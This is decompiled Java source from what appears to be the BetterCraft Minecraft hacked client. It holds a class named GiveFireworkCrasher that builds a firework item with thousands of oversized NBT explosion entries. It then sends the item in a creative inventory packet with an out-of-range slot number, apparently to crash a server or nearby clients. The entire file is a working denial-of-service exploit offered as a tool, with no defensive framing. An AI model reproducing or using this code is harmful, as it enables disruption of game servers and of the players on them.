/*    */ package me.nzxter.bettercraft.mods.crasher;
/*    */ 
/*    */ import java.util.Arrays;
/*    */ import net.minecraft.client.Minecraft;
/*    */ import net.minecraft.init.Items;
/*    */ import net.minecraft.item.ItemStack;
/*    */ import net.minecraft.nbt.NBTBase;
/*    */ import net.minecraft.nbt.NBTTagCompound;
/*    */ import net.minecraft.nbt.NBTTagList;
/*    */ import net.minecraft.network.Packet;
/*    */ import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
/*    */ 
/*    */ public class GiveFireworkCrasher {
/*    */   public static void start() {
/* 15 */     (new Thread()
/*    */       {
/*    */         public void run()
/*    */         {
/*    */           try {
/* 20 */             ItemStack firework = new ItemStack(Items.FIREWORKS);
/* 21 */             NBTTagCompound tagf = new NBTTagCompound();
/* 22 */             NBTTagCompound tage = new NBTTagCompound();
/* 23 */             NBTTagList list = new NBTTagList();
/* 24 */             int[] i = new int[64];
/* 25 */             for (int i2 = 0; i2 < 3260; i2++) {
/* 26 */               Arrays.fill(i, i2 + 1);
/* 27 */               NBTTagCompound tagx = new NBTTagCompound();
/* 28 */               tagx.setIntArray("Colors", i);
/* 29 */               list.appendTag((NBTBase)tagx);
/*    */             } 
/* 31 */             tage.setTag("Explosions", (NBTBase)list);
/* 32 */             tage.setByte("Flight", (byte)2);
/* 33 */             tagf.setTag("Fireworks", (NBTBase)tage);
/* 34 */             firework.setTagCompound(tagf);
/* 35 */             for (int i3 = 0; i3 < 100; i3++);
/* 36 */             (Minecraft.getMinecraft()).player.connection.sendPacket((Packet)new CPacketCreativeInventoryAction(2147483647, firework));
/*    */           }
/* 38 */           catch (Exception e2) {
/*    */             return;
/*    */           } 
/*    */         }
/* 42 */       }).start();
/*    */   }
/*    */ }


/* Location:              C:\Users\emlin\Desktop\BetterCraft.jar!\me\nzxter\bettercraft\mods\crasher\GiveFireworkCrasher.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */